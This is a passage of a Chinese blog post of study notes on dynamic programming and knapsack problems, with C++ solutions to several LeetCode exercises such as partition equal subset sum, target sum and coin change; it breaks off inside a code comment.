<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">numTrees</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">f</span><span class="params">(<span class="number">25</span>,<span class="number">0</span>)</span></span>;</span><br><span class="line">        f[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">        f[<span class="number">1</span>]=<span class="number">1</span>;</span><br><span class="line">        f[<span class="number">2</span>]=<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (n&lt;<span class="number">3</span>)</span><br><span class="line">            <span class="keyword">return</span> f[n];</span><br><span class="line">        f[<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">3</span>;i&lt;=n;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;=i<span class="number">-1</span>;j++)</span><br><span class="line">                f[i]+=f[j]*f[i-j<span class="number">-1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> f[n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="背包问题"><a href="#背包问题" class="headerlink" title="背包问题"></a>背包问题</h2><p><strong>0-1背包</strong>：n个物品，每种物品【1个】</p>
<ul>
<li>重量w[]，价值v[]</li>
<li>有一个最多能装w的背包</li>
<li>问：最多装的价值是多大</li>
</ul>
<p><strong>分析：</strong><br>暴力解法：每种物品只有两种状态：【取】【不取】 O(n^2)<br><strong>完全背包</strong>：n个物品，每种【无限个】<br>多重背包：n个物品，每种物品【个数各不相同】</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">**dp[i][j]**:</span><br><span class="line"> 表示：`前i件物品`，【恰好】装入`容量为j的背包`，获得的【最大价值】</span><br><span class="line">两个状态：</span><br><span class="line">    放物品i：dp[i][j] = dp[i<span class="number">-1</span>][j-w[i]] + v[i]</span><br><span class="line">    不放物品i：dp[i][j] = dp[i<span class="number">-1</span>][j]</span><br><span class="line">    dp[i][j] = max(dp[i<span class="number">-1</span>][j-w[i]] + v[i], dp[i<span class="number">-1</span>][j])</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/ff70a3064e3447adb7ef7ea24c46f402.png"></p>
<p><strong>初始化</strong>：第一行和第一列<br>可以一开始先把数组所有元素都初始化为0，之后再变 第一行和第一列；然后遍历填充别的位置。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 初始化 dp</span></span><br><span class="line"><span class="comment">//weight 物品重量   bagweight 背包容量</span></span><br><span class="line">vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">dp</span>(weight.<span class="built_in">size</span>(), vector&lt;<span class="keyword">int</span>&gt;(bagweight + <span class="number">1</span>, <span class="number">0</span>));</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = weight[<span class="number">0</span>]; j &lt;= bagweight; j++) &#123;</span><br><span class="line">    dp[<span class="number">0</span>][j] = value[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>【二维】遍历顺序：针对二位数组来说，先遍历 物品和先遍历背包都可以；并且正序倒序都行</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// weight数组的大小 就是物品个数</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; weight.<span class="built_in">size</span>(); i++) &#123; <span class="comment">// 遍历物品</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= bagweight; j++) &#123; <span class="comment">// 遍历背包容量</span></span><br><span class="line">        <span class="keyword">if</span> (j &lt; weight[i]) </span><br><span class="line">            dp[i][j] = dp[i - <span class="number">1</span>][j];</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">            dp[i][j] = <span class="built_in">max</span>(dp[i - <span class="number">1</span>][j], dp[i - <span class="number">1</span>][j - weight[i]] + value[i]);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/7c1f49f82e3f47c5ba643f7c8c1e0f43.png"><br><img src="https://img-blog.csdnimg.cn/daab9b48164e495ca026e6f3720c5c33.png"><br><img src="https://img-blog.csdnimg.cn/8adc6f2a83d54100bd9715bed72a14a1.png"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//测试代码</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test_2_wei_bag_problem1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; weight = &#123;<span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>&#125;;</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; value = &#123;<span class="number">15</span>, <span class="number">20</span>, <span class="number">30</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> bagweight = <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 二维数组</span></span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">dp</span>(weight.<span class="built_in">size</span>(), vector&lt;<span class="keyword">int</span>&gt;(bagweight + <span class="number">1</span>, <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = weight[<span class="number">0</span>]; j &lt;= bagweight; j++) &#123;</span><br><span class="line">        dp[<span class="number">0</span>][j] = value[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// weight数组的大小 就是物品个数</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; weight.<span class="built_in">size</span>(); i++) &#123; <span class="comment">// 遍历物品</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= bagweight; j++) &#123; <span class="comment">// 遍历背包容量</span></span><br><span class="line">            <span class="keyword">if</span> (j &lt; weight[i]) </span><br><span class="line">                dp[i][j] = dp[i - <span class="number">1</span>][j];</span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">                dp[i][j] = <span class="built_in">max</span>(dp[i - <span class="number">1</span>][j], dp[i - <span class="number">1</span>][j - weight[i]] + value[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; dp[weight.<span class="built_in">size</span>() - <span class="number">1</span>][bagweight] &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">test_2_wei_bag_problem1</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>转化为一维数组：滚动数组</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">放物品i：dp[i][j] = dp[i<span class="number">-1</span>][j-w[i]] + v[i]</span><br><span class="line">不放物品i：dp[i][j] = dp[i<span class="number">-1</span>][j]</span><br><span class="line">dp[i][j] = <span class="built_in">max</span>(dp[i<span class="number">-1</span>][j], dp[i<span class="number">-1</span>][j-w[i]] + v[i])</span><br><span class="line">因为每次的dp[i][j]只与dp[i<span class="number">-1</span>]的状态有关，之后不再用到，因此可转化为一维数组，相当于把dp[i<span class="number">-1</span>][j]的部分存到dp[j]中</span><br><span class="line">转化为：</span><br><span class="line">    dp[j] = <span class="built_in">max</span>(j, j-w[i]+v[i])</span><br></pre></td></tr></table></figure>
<p><strong>【一维】遍历顺序：针对二位数组来说，先遍历 物品和先遍历背包都可以；并且正序倒序都行</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test_1_wei_bag_problem</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; weight = &#123;<span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>&#125;;</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; value = &#123;<span class="number">15</span>, <span class="number">20</span>, <span class="number">30</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> bagWeight = <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化</span></span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">dp</span><span class="params">(bagWeight + <span class="number">1</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; weight.<span class="built_in">size</span>(); i++) &#123; <span class="comment">// 遍历物品</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = bagWeight; j &gt;= weight[i]; j--) &#123; <span class="comment">// 遍历背包容量</span></span><br><span class="line">            dp[j] = <span class="built_in">max</span>(dp[j], dp[j - weight[i]] + value[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; dp[bagWeight] &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">test_1_wei_bag_problem</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="416-分割等和子集"><a href="#416-分割等和子集" class="headerlink" title="416 分割等和子集"></a>416 分割等和子集</h3><p>给你一个 只包含正整数 的 非空 数组 nums 。请你判断是否可以将这个数组分割成两个子集，使得两个子集的元素和相等。</p>
<p><strong>分析：</strong><br>每个元素放一次，可理解为0-1背包</p>
<ul>
<li>背包的体积为sum / 2</li>
<li>背包要放入的商品（集合里的元素）重量为 元素的数值，价值也为元素的数值</li>
<li>背包如果正好装满，说明找到了总和为 sum / 2 的子集。</li>
<li>背包中每一个元素是不可重复放入。<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    动态规划</span></span><br><span class="line"><span class="comment">    dp[i] 物品i 放入背包j 后的 最大价值</span></span><br><span class="line"><span class="comment">    物品重量：每个元素值</span></span><br><span class="line"><span class="comment">    物品价值：每个元素值</span></span><br><span class="line"><span class="comment">    背包重量：元素和/2</span></span><br><span class="line"><span class="comment">    使用一维数组：</span></span><br><span class="line"><span class="comment">        dp[j]=max(dp[j],dp[j-w[i]]+v[i])</span></span><br><span class="line"><span class="comment">    注意：如果题目给的价值都是正整数那么非0下标都初始化为0就可以了，如果题目给的价值有负数，那么非0下标就要初始化为负无穷。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">canPartition</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span>(n&lt;<span class="number">2</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">dp</span><span class="params">(<span class="number">10001</span>,<span class="number">0</span>)</span></span>;<span class="comment">//初始化为0：因为所有元素 是正数</span></span><br><span class="line">        <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">            sum += nums[i];<span class="comment">//求sum/2</span></span><br><span class="line">        <span class="comment">// int sum = accumulate(nums.begin(), nums.end(), 0);</span></span><br><span class="line">        <span class="keyword">if</span>(sum%<span class="number">2</span>==<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">int</span> target = sum/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;<span class="comment">//遍历元素-物品</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=target;j&gt;=nums[i];j--)&#123;<span class="comment">//注意j&gt;=w[i]</span></span><br><span class="line">                dp[j] = <span class="built_in">max</span>(dp[j],dp[j-nums[i]]+nums[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(dp[target]==target)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="1046-最后一块石头的重量"><a href="#1046-最后一块石头的重量" class="headerlink" title="1046 最后一块石头的重量"></a>1046 最后一块石头的重量</h3></li>
</ul>
<p>有一堆石头，每块石头的重量都是正整数。<br>每一回合，从中选出 <strong>两块 最重的</strong> 石头，然后将它们一起粉碎。假设石头的重量分别为 x 和 y，且 x &lt;= y。那么粉碎的可能结果如下：</p>
<pre><code>如果 x == y，那么两块石头都会被完全粉碎；
如果 x != y，那么重量为 x 的石头将会完全粉碎，而重量为 y 的石头新重量为 y-x。
</code></pre>
<p>最后，最多只会剩下一块石头。<strong>返回此石头的重量</strong>。如果没有石头剩下，就返回 0。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    大顶堆</span></span><br><span class="line"><span class="comment">        priority_queue&lt;int&gt; q;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">lastStoneWeight</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; stones)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//大顶堆</span></span><br><span class="line">        priority_queue&lt;<span class="keyword">int</span>&gt; q;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> s:stones)</span><br><span class="line">            q.<span class="built_in">push</span>(s);</span><br><span class="line">        <span class="keyword">while</span>(q.<span class="built_in">size</span>()&gt;<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">int</span> a = q.<span class="built_in">top</span>();</span><br><span class="line">            q.<span class="built_in">pop</span>();</span><br><span class="line">            <span class="keyword">int</span> b = q.<span class="built_in">top</span>();</span><br><span class="line">            q.<span class="built_in">pop</span>();</span><br><span class="line">            <span class="keyword">if</span>(a&gt;b)</span><br><span class="line">                q.<span class="built_in">push</span>(a-b);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> q.<span class="built_in">empty</span>()?<span class="number">0</span>:q.<span class="built_in">top</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ol start="1049">
<li>最后一块石头的重量 II<br>有一堆石头，用整数数组 stones 表示。其中 stones[i] 表示第 i 块石头的重量。<br>每一回合，从中选出 <strong>任意两块</strong> 石头，然后将它们一起粉碎。假设石头的重量分别为 x 和 y，且 x &lt;= y。那么粉碎的可能结果如下：</li>
</ol>
<pre><code>如果 x == y，那么两块石头都会被完全粉碎；
如果 x != y，那么重量为 x 的石头将会完全粉碎，而重量为 y 的石头新重量为 y-x。
</code></pre>
<p>最后，最多只会剩下一块 石头。<strong>返回此石头 <code>最小</code>的可能重量</strong> 。如果没有石头剩下，就返回 0。</p>
<p><strong>关键：将石头 尽可能分成重量 相等 的两堆，这样最后相撞之后，剩余的石头重量会尽可能 最小</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">lastStoneWeightII</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; stones)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = stones.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">dp</span><span class="params">(<span class="number">15001</span>,<span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="keyword">int</span> sum = <span class="built_in">accumulate</span>(stones.<span class="built_in">begin</span>(),stones.<span class="built_in">end</span>(),<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">int</span> target = sum/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=target;j&gt;=stones[i];j--)&#123;</span><br><span class="line">                dp[j] = <span class="built_in">max</span>(dp[j],dp[j-stones[i]]+stones[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            最后，一堆能分成 的集合数值最大是 dp[target]</span></span><br><span class="line"><span class="comment">            另一堆就是 sum-dp[target]</span></span><br><span class="line"><span class="comment">            最后结果是 两个只差</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">return</span> sum-dp[target]-dp[target];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="494-目标和"><a href="#494-目标和" class="headerlink" title="494 目标和"></a>494 目标和</h3><p>给你一个非负整数数组 nums 和一个整数 target 。</p>
<p>向数组中的每个整数前添加 ‘+’ 或 ‘-‘ ，然后串联起所有整数，可以构造一个 表达式 ：</p>
<pre><code>例如，nums = [2, 1] ，可以在 2 之前添加 &#39;+&#39; ，在 1 之前添加 &#39;-&#39; ，然后串联起来得到表达式 &quot;+2-1&quot; 。
</code></pre>
<p>返回可以通过上述方法构造的、<strong>运算结果等于 target</strong> 的 <strong>不同 表达式 的数目</strong>。<br>可以划分成两个集合：</p>
<pre><code>    【前面符号是+】的集合 left
    【前面符号是-】的集合 right
这样 left+right=sum
    left-right=target
化简：
    right=sum-left
    left-(sum-left)=target
得到 left=(sum+target)/2
</code></pre>
<p>也就是说，按照题目的要求 给出了sum和target ，我们是可以确定left和right的数值的。即可以知道前面符号是+应该有多少种元素，前面符号是-有多少种元素。</p>
<p>相当于，已知背包容量和物品价值、个数，问：能有多少种方式去装，使得恰好装满背包。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    dp[j] 装满容量是j的背包，共有几种 不同的方式</span></span><br><span class="line"><span class="comment">    理解：</span></span><br><span class="line"><span class="comment">  nums[i]物品大小    dp[5]:装满j=5背包的 【方法数量】</span></span><br><span class="line"><span class="comment">        1           dp[4]</span></span><br><span class="line"><span class="comment">        2           dp[3]</span></span><br><span class="line"><span class="comment">        3           dp[2]</span></span><br><span class="line"><span class="comment">        4           dp[1]</span></span><br><span class="line"><span class="comment">        5           dp[0]</span></span><br><span class="line"><span class="comment">    所以：</span></span><br><span class="line"><span class="comment">        dp[j] += dp[j-nums[i]]</span></span><br><span class="line"><span class="comment">    初始化：</span></span><br><span class="line"><span class="comment">        dp[0] = 1; 装满背包容量为0的方法有 1种</span></span><br><span class="line"><span class="comment">    举例：</span></span><br><span class="line"><span class="comment">        nums[0,0,0,0,0] 有5个元素，都是0</span></span><br><span class="line"><span class="comment">        target=0 left=0</span></span><br><span class="line"><span class="comment">    则：</span></span><br><span class="line"><span class="comment">        总共有2^5种方法，即每个元素前面是+或者-都可，因此总共有32种方法。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">findTargetSumWays</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">int</span> sum = <span class="built_in">accumulate</span>(nums.<span class="built_in">begin</span>(),nums.<span class="built_in">end</span>(),<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">int</span> left = (sum+target)/<span class="number">2</span>;<span class="comment">//手推出来的，表示【前面符号是+的元素个数】</span></span><br><span class="line">        <span class="keyword">if</span>((sum+target)%<span class="number">2</span>==<span class="number">1</span>)<span class="comment">//这里很重要</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">abs</span>(target)&gt;sum)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">dp</span><span class="params">(left+<span class="number">1</span>,<span class="number">0</span>)</span></span>;</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">1</span>;<span class="comment">//注意！！！！</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=left;j&gt;=nums[i];j--)&#123;</span><br><span class="line">                dp[j] += dp[j-nums[i]];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[left];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="474-一和零"><a href="#474-一和零" class="headerlink" title="474 一和零"></a>474 一和零</h3><p>给你一个二进制字符串数组 strs 和两个整数 m 和 n 。<br>请你找出并返回 strs 的最大子集的长度，该子集中 最多 有 m 个 0 和 n 个 1 。<br>如果 x 的所有元素也是 y 的元素，集合 x 是集合 y 的 子集 。<br><strong>完全背包</strong>：n个物品，每种【无限个】<br>也就是说，背包中可以放 多个同一物品<br>求：将哪些物品装入背包里物品价值总和最大。<br><img src="https://img-blog.csdnimg.cn/11a651d2c9ef43549d56a4a3fb9f87a6.png"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*  与0-1背包的区别：遍历顺序 改为【正序】，并且可以先遍历物品，也可以先遍历背包（只针对纯正的完全背包问题）*/</span></span><br><span class="line"><span class="comment">// 先遍历物品，再遍历背包</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; weight.<span class="built_in">size</span>(); i++) &#123; <span class="comment">// 遍历物品</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j = weight[i]; j &lt;= bagWeight ; j++) &#123; <span class="comment">// 遍历背包容量</span></span><br><span class="line">        dp[j] = <span class="built_in">max</span>(dp[j], dp[j - weight[i]] + value[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/e83878020ff7421c85c036d490ddc86c.png"></p>
<h3 id="322-零钱兑换——最少物品数"><a href="#322-零钱兑换——最少物品数" class="headerlink" title="322 零钱兑换——最少物品数"></a>322 零钱兑换——最少物品数</h3><p>给你一个整数数组 coins ，表示不同面额的硬币；以及一个整数 amount ，表示总金额。<br>计算并返回可以凑成<strong>总金额所需的 最少的硬币个数</strong> 。如果没有任何一种硬币组合能组成总金额，返回 -1 。<br>你可以认为每种硬币的数量是<strong>无限的</strong>。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    物品i-硬币面额coins    背包j-总金额amount</span></span><br><span class="line"><span class="comment">    dp[i] 凑满容量为j的背包所需 【最少物品数】</span></span><br><span class="line"><span class="comment">    dp[0] = 0;</span></span><br><span class="line"><span class="comment">    dp[j] = min(dp[j],dp[j-coins[i]]+1)</span></span><br><span class="line"><span class="comment">    遍历顺序：</span></span><br><span class="line"><span class="comment">        均可，因为硬币个数 没有顺序</span></span><br><span class="line"><span class="comment">    注意判断：</span></span><br><span class="line"><span class="comment">        dp[j-coins[i]]!=INT_MAX</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">coinChange</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; coins, <span class="keyword">int</span> amount)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = coins.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">dp</span><span class="params">(amount+<span class="number">1</span>,INT_MAX)</span></span>;</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;=amount;j++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(j-coins[i]&gt;=<span class="number">0</span> &amp;&amp; dp[j-coins[i]]!=INT_MAX)<span class="comment">//注意！！！</span></span><br><span class="line">                    dp[j] = <span class="built_in">min</span>(dp[j],dp[j-coins[i]]+<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[amount]==INT_MAX?<span class="number">-1</span>:dp[amount];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//先 物品 后背包</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">coinChange</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; coins, <span class="keyword">int</span> amount)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = coins.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">dp</span><span class="params">(amount+<span class="number">1</span>,INT_MAX)</span></span>;</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=coins[i];j&lt;=amount;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(dp[j-coins[i]]!=INT_MAX)<span class="comment">//注意！！！</span></span><br><span class="line">                    dp[j] = <span class="built_in">min</span>(dp[j],dp[j-coins[i]]+<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[amount]==INT_MAX?<span class="number">-1</span>:dp[amount];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="518-零钱兑换-II（组合数）"><a href="#518-零钱兑换-II（组合数）" class="headerlink" title="518 零钱兑换 II（组合数）"></a>518 零钱兑换 II（组合数）</h3><p>给你一个整数数组 coins 表示不同面额的硬币，另给一个整数 amount 表示总金额。<br>请你计算并返回可以<strong>凑成总金额的硬币组合数(不同顺序算同一组合)<strong>。如果任何硬币组合都无法凑出总金额，返回 0 。<br>假设每一种面额的硬币有</strong>无限个</strong>。<br>题目数据保证结果符合 32 位带符号整数。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    物品i-硬币面额coins    背包j-总金额amount</span></span><br><span class="line"><span class="comment">    dp[i] 凑满容量为j的背包的 【硬币组合数】</span></span><br><span class="line"><span class="comment">    dp[0] = 1;</span></span><br><span class="line"><span class="comment">    dp[j] += dp[j-coins[i]]</span></span><br><span class="line"><span class="comment">    新颖点：</span></span><br><span class="line"><span class="comment">        遍历顺序唯一！！！！！先物品？先背包？</span></span><br><span class="line"><span class="comment">        必须，先遍历物品，后遍历背包——&gt;组合数</span></span><br><span class="line"><span class="comment">        for(int i=0;i&lt;n;i++)&#123;</span></span><br><span class="line"><span class="comment">            for(int j=coins[i];j&lt;=amount;j++)&#123;</span></span><br><span class="line"><span class="comment">                dp[j] += dp[j-coins[i]];</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        否则，先遍历背包，后遍历物品——&gt;排列数</span></span><br><span class="line"><span class="comment">        for(int j=0;i&lt;=amount;j++)&#123;</span></span><br><span class="line"><span class="comment">            for(int i=0;i&lt;n;i++)&#123;</span></span><br><span class="line"><span class="comment">                if (j-coins[i] &gt;= 0)</span></span><br><span class="line"><span class="comment">                    dp[j] += dp[j-coins[i]];</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">        